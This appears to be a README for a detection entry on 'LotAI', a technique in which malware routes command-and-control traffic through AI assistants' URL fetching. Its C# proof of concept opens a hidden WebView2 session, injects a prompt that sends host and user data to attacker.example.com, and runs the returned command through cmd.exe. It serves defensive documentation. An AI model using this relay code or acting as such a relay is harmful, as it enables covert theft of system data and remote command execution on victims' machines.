# LotAI — AI Assistant Used as Covert C2 Relay

Demonstrates detection of the LotAI (Living off the AI) technique documented
by BlackFog and ProArch (February–March 2026), where malware abuses AI
assistants with URL-fetching capabilities as command-and-control relays.

## Attack Overview

The LotAI technique uses hidden WebView2 sessions to route C2 traffic through
trusted AI assistant domains like copilot.microsoft.com and grok.com.

## Proof of Concept

```csharp
// Step 1: Open hidden WebView2 session to AI assistant
var webview = new WebView2();
webview.Visible = false;  // hidden session
webview.Navigate("https://copilot.microsoft.com");

// Step 2: Inject prompt with recon data as query parameters
string recon = $"hostname={hostname}&user={username}&os={osVersion}";
string prompt = $"Summarize this page: https://attacker.example.com/page?{recon}";
webview.ExecuteScript($"document.querySelector('textarea').value = '{prompt}'");

// Step 3: Parse AI response for embedded command
// The AI assistant fetches the attacker URL and returns content
// containing hidden commands in the response
string aiResponse = webview.GetResponseText();
string command = ExtractCommand(aiResponse);

// Step 4: Execute extracted command
Process.Start("cmd.exe", $"/c {command}");
// Living off the AI — traffic appears as normal AI usage
```

## Detection Rationale

This is a covert ai assistant c2 exfiltration relay technique that abuses
trusted AI domains to bypass network security controls.
